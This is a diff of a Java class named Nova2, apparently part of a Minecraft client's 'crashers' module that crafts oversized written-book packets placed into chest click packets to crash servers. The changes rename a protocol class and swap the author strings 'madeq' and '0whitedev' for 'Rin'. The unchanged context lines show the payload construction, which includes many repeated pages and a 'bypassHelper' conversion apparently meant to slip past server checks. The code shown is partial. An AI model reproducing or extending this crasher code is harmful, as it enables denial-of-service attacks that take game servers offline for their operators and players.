@@ -14,7 +14,7 @@ import net.minecraft.world.item.Items;
 import us.whitedev.crashers.Crasher;
 import us.whitedev.gui.clickgui.ClickGui;
 import us.whitedev.helpers.PacketHelper;
-import us.whitedev.protocol.XynisProtocol;
+import us.whitedev.protocol.RedSignalProtocol;
 import us.whitedev.protocol.components.data.DataComponents;
 import us.whitedev.protocol.components.data.impl.DataContainer;
 import us.whitedev.protocol.components.data.impl.DataWritableBookContent;
@@ -59,7 +59,7 @@ public class Nova2 implements Crasher {
         PacketContainerClick dataPacket;
 
         int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
-        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
+        if (RedSignalProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
             nbtPacket = null;
             dataPacket = getDataChestPacket(size, amount, scales, type, protocol);
         } else {
@@ -90,7 +90,7 @@ public class Nova2 implements Crasher {
         for (int i = 0; i < amount; ++i) pagesTag.add(pageTag);
         CompoundTag bookTag = new CompoundTag();
         bookTag.put("pages", pagesTag);
-        bookTag.putString("author", "madeq");
+        bookTag.putString("author", "Rin");
         bookTag.putString("title", "sigma");
 
         ListTag chestItemsTag = new ListTag();
@@ -131,7 +131,7 @@ public class Nova2 implements Crasher {
             CompoundTag pageText = bypassHelper.convert(text);
             List<Filterable<Tag>> pagesList = new ArrayList<>();
             for (int i = 0; i < amount; i++) pagesList.add(new Filterable<>(pageText, null));
-            DataWrittenBookContent dataWrittenBookContent = new DataWrittenBookContent(new Filterable<>("madeq", null), "0whitedev", 1, pagesList, true);
+            DataWrittenBookContent dataWrittenBookContent = new DataWrittenBookContent(new Filterable<>("Rin", null), "Rin", 1, pagesList, true);
 
             DataComponents dataComponents = new DataComponents();
             dataComponents.put(dataWrittenBookContent);
